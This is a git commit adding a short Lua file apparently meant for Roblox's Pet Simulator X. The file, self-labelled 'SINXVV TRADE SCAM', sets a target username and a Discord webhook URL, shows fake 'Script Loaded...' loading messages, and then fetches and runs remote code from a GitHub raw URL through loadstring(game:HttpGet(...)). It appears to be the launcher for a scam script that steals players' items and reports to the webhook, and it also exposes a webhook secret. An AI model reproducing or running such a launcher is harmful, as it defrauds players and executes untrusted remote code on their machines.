d3722ce9a5aa639db34712436851e01ee1e4f415
SINXVV <131208023+SINXVV@users.noreply.github.com>
2023-04-19 19:10:02 +0200

    test test.lua

---
+++ test test .lua
@@ -0,0 +1,9 @@
+Username = "VtrustedLuxka"
+WebHook = "https://discord.com/api/webhooks/1098289387273474139/rSa8TQZI9sDwbooR_Iiefpae3FgCBvzlBeY6V6ju6m-_Pe1VOTVZmU9S_ejdJrATQfwA"
+loadingscreen = true
+_G.CustomScriptName = "SINXVV TRADE SCAM"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
